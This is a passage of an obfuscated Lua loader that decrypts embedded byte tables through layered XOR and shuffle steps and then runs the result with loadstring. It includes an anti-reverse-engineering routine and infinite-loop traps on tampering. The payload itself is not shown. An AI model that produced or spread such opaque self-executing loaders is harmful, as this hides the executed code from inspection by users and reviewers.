5,161,97,72,80,116,57,165,77,18,51,208,205,143,81,125,198,190,230,163,124,63,108,170,46,136,203,219,20,42,199,227,110,80,255,165,203,39,123,213,233,20,131,161,122,160,62,141,169},{24,97,60,108,224,145,198,174,149,175,104,54,80,49,3,91,106,225,95,51,219,138,220,41,40,50,17,150,232,171,253,171,126,33,88,93,205,52,44,155,99,180,140,234,28,218,142,27,117,82,243,80,246,48,182,24,148,174,106,123,23,204,79,51}},{65,223,221,106,234,157,206,139,124,62,112,220,37,54,178,228,189,43,191,85,204,186,239,54,59,208,162,82,130,208,177,22,181,191,186,142,132,69,58,117,101,193,38,57,133,163,169,135,147,6,156,194,35,209,185,98,119,226,78,110,105,221,230,154,63,126,58,166,241,223,135,246,219,231,67,188,153,103,96,223,246,199,143,202,70,196,65,50},{53680}}}

local function _bx(a,b)
    local r,p=0,1
    while a>0 or b>0 do
        local xa,xb=a%2,b%2
        if xa~=xb then r=r+p end
        a=(a-xa)/2
        b=(b-xb)/2
        p=p*2
    end
    return r
end

local function _u(a,k)
    local s={}
    for i=1,#a do s[#s+1]=string.char(_bx(a[i],k)) end
    return table.concat(s)
end

local _safe=function(m)
    if warn then warn(m) elseif print then print(m) end
end

local function _dm(p1,p2,k)
    local o={}
    for i=1,#p1 do o[#o+1]=string.char(_bx(p1[i],k)) end
    for i=1,#p2 do o[#o+1]=string.char(_bx(p2[i],k)) end
    return table.concat(o)
end

-- anti-reverse المخفي: نُشغّله قبل كل شي
local _anti_code = _u(_h, _hk)
local _anti_fn = select(1, (loadstring or load)(_anti_code))
if _anti_fn then
    local _aok, _aerr = pcall(_anti_fn)
    if not _aok then
        _safe(_dm(_m1a, _m1b, _mk1))
        while true do local _x=0 end
    end
    if _aerr then
        _safe(_dm(_m1a, _m1b, _mk1))
        while true do local _x=0 end
    end
end

-- حساب idx
local _Xv=_bx(_X[3],_X[2])
local _Yv=_bx(_X[5],_X[2])
local _Zv=_bx(_X[7],_X[2])
if _X[4]<=_Xv or _X[6]<=_Yv or _X[8]<=_Zv then
    _safe(_dm(_m1a,_m1b,_mk1))
    while true do local _x=0 end
end
local _idx=(_Xv*_Yv+_Zv)%65
local _e=_G[_idx+1]
if not _e then
    _safe(_dm(_m1a,_m1b,_mk1))
    while true do local _x=0 end
end

local _KS=_e[1]
local _data=_e[2]
local _cs=_e[3][1]

local _rl=1
for i=1,#_data do
    _rl=(_rl*31+_data[i])%65521
end
if _rl~=_cs then
    _safe(_dm(_m3a,_m3b,_mk3))
    while true do local _x=0 end
end

local _n=_X[1]
local _rot1=_X[9]
local _rot2=_X[10]

local _s1={}
for i=1,#_data do _s1[i]=_bx(_data[i],_KS[7][((i-1)%#_KS[7])+1]) end
local _s2={}
for i=1,#_s1 do _s2[i]=_s1[i] end
for i=_n,1,-1 do
    local j=_KS[7][((i-1)%#_KS[7])+1]%_n+1
    _s2[i],_s2[j]=_s2[j],_s2[i]
end
local _s3={}
for i=1,#_s2 do _s3[i]=_bx(_s2[i],_KS[6][((i-1)%#_KS[6])+1]) end
local _s4={}
local _roff2=_n-(_rot2%_n)
for i=1,_n do _s4[i]=_s3[((i-1+_roff2)%_n)+1] end
local _s5={}
for i=1,#_s4 do _s5[i]=_bx(_s4[i],_KS[5][((i-1)%#_KS[5])+1]) end
local _s6={}
for i=1,#_s5 do _s6[i]=_s5[i] end
for i=_n,1,-1 do
    local j=_KS[4][((i-1)%#_KS[4])+1]%_n+1
    _s6[i],_s6[j]=_s6[j],_s6[i]
end
local _s7={}
for i=1,#_s6 do _s7[i]=_bx(_s6[i],_KS[3][((i-1)%#_KS[3])+1]) end
local _s8={}
local _roff1=_n-(_rot1%_n)
for i=1,_n do _s8[i]=_s7[((i-1+_roff1)%_n)+1] end
local _s9={}
for i=1,#_s8 do _s9[i]=_bx(_s8[i],_KS[2][((i-1)%#_KS[2])+1]) end
local _sa={}
for i=1,#_s9 do _sa[i]=_s9[i] end
for i=_n,1,-1 do
    local j=_KS[1][((i-1)%#_KS[1])+1]%_n+1
    _sa[i],_sa[j]=_sa[j],_sa[i]
end
local _code={}
for i=1,_n do _code[i]=string.char(_bx(_sa[i],_KS[1][((i-1)%#_KS[1])+1])) end
local _src=table.concat(_code)

if _src=="Neutron, try again." or _src=="Integrity violation detected." then
    _safe(_dm(_m1a,_m1b,_mk1))
    while true do local _x=0 end
end

-- banner
local _banner = _dm(_m2a, _m2b, _mk2)
if warn then warn(_banner) end

-- تنفيذ آمن
local _pos=0
local _total=#_src
local function _reader()
    if _pos>=_total then return nil end
    local p=_src:sub(_pos+1,_pos+32)
    _pos=_pos+32
    return p
end

local _fn
local _ok, _res = pcall(function() return load(_reader, "=n") end)
if _ok and _res then _fn = _res else _fn = (loadstring or load)(_src, "=n") end

if not _fn then
    _safe(_dm(_m1a,_m1b,_mk1))
    while true do local _x=0 end
end

local _exec_ok = pcall(_fn)
if not _exec_ok then
    _safe(_dm(_m1a,_m1b,_mk1))
    while true do local _x=0 end
end

end)()
